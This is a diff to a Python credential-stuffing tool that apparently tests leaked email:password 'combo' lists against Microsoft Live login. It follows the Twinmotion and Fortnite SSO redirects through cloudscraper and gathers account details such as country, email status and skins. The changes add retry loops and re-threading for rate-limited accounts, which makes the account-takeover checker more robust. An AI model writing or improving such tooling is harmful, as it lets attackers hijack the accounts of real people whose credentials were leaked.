@@ -7,6 +7,8 @@ from threading import Thread
 import time
 from colorama import Fore, init
 from ctypes import windll
+import random
+import string
 
 def prints(line):
     print(f'{line}')
@@ -71,6 +73,7 @@ def parse_1(text):
         email_verified_status = 'Unknown'
     return display_name,country,accid,email_verified_status
 
+            
 skins_data = []
 sellerstuff = []
 toomany = []
@@ -83,7 +86,7 @@ def check(line):
     folder = 'Results'
     # print(user)
     # print(password)
-
+    
     session = requests.sessions.session()
     scraper = cloudscraper.create_scraper()
     url = 'https://login.live.com/ppsecure/post.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&contextid=A31E247040285505&opid=F7304AA192830107&bk=1701944501&uaid=a7afddfca5ea44a8a2ee1bba76040b3c&pid=15216'
@@ -409,17 +412,29 @@ def check(line):
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
         }
         
-        response = scraper.get(url, headers=headers, allow_redirects=False, cookies=response.cookies)
-        if 'https://www.twinmotion.com:443/id/api/sso?sid=' in response.headers['location']:
-            url = response.headers['location']
-        else:
-            print(response.url)
+        while True:
+            try:
+                response = scraper.get(url, headers=headers, allow_redirects=False, cookies=response.cookies)
+                if 'https://www.twinmotion.com:443/id/api/sso?sid=' in response.headers['location']:
+                    url = response.headers['location']
+                    break
+                else:
+                    print(response.url)
+                    break
+            except:
+                continue
         
-        response = scraper.get(url, headers=headers, allow_redirects=False, cookies=response.cookies)
-        if 'https://www.fortnite.com:443/id/api/sso?' in response.headers['location']:
-            url = response.headers['location']
-        else:
-            print(response.url)
+        while True:
+            try:
+                response = scraper.get(url, headers=headers, allow_redirects=False, cookies=response.cookies)
+                if 'https://www.fortnite.com:443/id/api/sso?' in response.headers['location']:
+                    url = response.headers['location']
+                    break
+                else:
+                    print(response.url)
+                    break
+            except:
+                continue
         
         while True:
             try:
@@ -856,8 +871,9 @@ def banner():
 {lgreen}╚═╝  ╚═╝╚═╝  ╚═╝     ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
 ''')
 
-threads  = []
 
+threads  = []
+threads2 = []
 start =  time.time()
 
 
@@ -872,6 +888,7 @@ def main():
             total_lines = len(clean_accs)
             print(f'Loaded Combo: {total_lines}\n{rescolor}')
             for acc in clean_accs:
+                clean_accs.remove(acc)
                 if check_domain(acc):
                     th = Thread(target=check, args=(acc,))
                     threads.append(th)
@@ -880,19 +897,19 @@ def main():
             for th in threads:
                 th.join()
         
-        while True:
-            if len(toomany) > 0:
-                # print(f'\nRemaining Accounts - {blue}({len(toomany)}){white} - Checking Them\n')
-                for acc in toomany:
-                    toomany.remove(acc)
-                    th = Thread(target=check, args=(acc,))
-                    threads.append(th)
-                    th.start()
-                    time.sleep(0.002)
-                for th in threads:
-                    th.join()
-            else:
-                break
+            while True:
+                if len(toomany) > 0:
+                    # print(f'\nRemaining Accounts - {blue}({len(toomany)}){white} - Checking Them\n')
+                    for acc in toomany:
+                        toomany.remove(acc)
+                        th = Thread(target=check, args=(acc,))
+                        threads2.append(th)
+                        th.start()
+                        time.sleep(0.002)
+                    for th in threads2:
+                        th.join()
+                else:
+                    break
     else:
         print(f'\n{red}No Combo File Found{white}\n')
         input('')
